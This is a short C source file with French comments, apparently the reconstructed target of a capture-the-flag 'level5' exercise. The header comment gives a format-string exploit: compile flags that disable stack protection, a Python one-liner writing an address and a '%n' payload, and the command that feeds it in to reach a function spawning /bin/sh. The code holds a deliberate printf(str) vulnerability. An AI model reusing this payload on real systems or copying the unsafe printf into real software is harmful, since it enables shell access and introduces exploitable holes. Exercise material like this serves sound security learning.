/*
	Pour compiler le .c:
	gcc -m32 -fno-stack-protector source.c -o level5

	Ensuite:
	python -c 'print "\x10\xa0\x04\x08"+"%134513900d%6$n"' > /tmp/lvl5

	Pour finir:
	cat /tmp/lvl5 - | ./level5
*/
#include <stdio.h>
#include <stdlib.h>

void	o(void)
{
	system("/bin/sh");		// Lancement de shell
	_exit(1);				// Exit du programme
}

void	n(void)
{
	char	str[512];		// Définition du buffer

	fgets(str, 512, stdin);	// Saisie de caractères et de chaînes avec une taille définie
	printf(str);			// Affichage de la chaine entrée dans fgets
	exit(1);				// Exit du programme
}

int 	main(void)
{
	n();					// Appel fonction n()
	return 0;
}
